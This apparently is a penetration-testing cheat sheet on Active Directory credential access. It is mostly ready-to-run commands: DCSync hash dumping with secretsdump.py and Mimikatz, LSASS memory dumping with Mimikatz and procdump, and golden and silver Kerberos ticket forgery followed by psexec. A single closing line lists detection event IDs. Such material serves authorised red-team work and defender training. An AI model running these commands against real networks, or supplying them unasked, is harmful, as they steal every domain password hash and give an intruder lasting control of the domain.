# DCSync and Credential Access

DCSync simulates a replication request to the DC — it dumps all password hashes without touching LSASS. Requires Domain Admin, or an account with Replicating Directory Changes rights.

## DCSync with Impacket (from Linux)

```bash
# Dump all accounts
secretsdump.py domain.local/admin:pass@DC_IP

# Dump specific account
secretsdump.py domain.local/admin:pass@DC_IP -just-dc-user krbtgt
secretsdump.py domain.local/admin:pass@DC_IP -just-dc-user administrator

# With PtH
secretsdump.py domain.local/admin@DC_IP -hashes :NTLM_HASH
```

## DCSync with Mimikatz (from Windows DA shell)

```powershell
# Load Mimikatz
.\mimikatz.exe

# Dump single account
lsadump::dcsync /domain:domain.local /user:administrator
lsadump::dcsync /domain:domain.local /user:krbtgt

# Dump all hashes
lsadump::dcsync /domain:domain.local /all /csv
```

## LSASS Credential Dumping (local machine)

```powershell
# Mimikatz — dump cleartext and hashes from LSASS
privilege::debug
sekurlsa::logonpasswords

# Dump LSASS process (less AV-noisy, analyze offline)
.\procdump64.exe -ma lsass.exe lsass.dmp
# Transfer lsass.dmp to Linux, then:
# pypykatz lsa minidump lsass.dmp
```

## Golden Ticket (Post-DCSync)

Once you have the `krbtgt` hash, you own the domain permanently:

```powershell
# Get domain SID first
Get-DomainSID   # PowerView

# Mimikatz golden ticket
kerberos::golden /user:FakeAdmin /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH \
  /id:500 /groups:512 /ptt
```

```bash
# From Linux (Impacket)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain domain.local FakeAdmin
export KRB5CCNAME=FakeAdmin.ccache
psexec.py -k -no-pass domain.local/FakeAdmin@DC_IP
```

## Silver Ticket (Service-Specific)

Forge a TGS for a specific service using that service account's hash:
```bash
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXX -domain domain.local \
  -spn cifs/server.domain.local FakeUser
```

**Detection:** Event ID 4662 (object accessed with replication rights), Event ID 4769 (unusual TGS requests). DCSync from non-DC IPs is highly anomalous.
